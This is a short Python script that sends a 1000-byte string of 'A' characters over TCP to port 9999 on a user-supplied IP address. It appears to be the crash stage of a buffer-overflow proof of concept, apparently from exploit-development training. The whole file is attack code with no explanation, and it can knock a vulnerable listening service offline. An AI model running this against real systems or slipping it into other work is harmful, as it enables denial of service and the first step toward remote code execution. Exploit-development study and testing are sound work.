import struct
import socket
import sys
from struct import pack

buf = b"A" * 1000

def main():
  if len(sys.argv) != 2:
    print("Usage: %s <ip_address>\n" % (sys.argv[0]))
    sys.exit(1)

  server = sys.argv[1]
  port = 9999
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  print("[+] Packet sent")


if __name__ == "__main__":
  main()
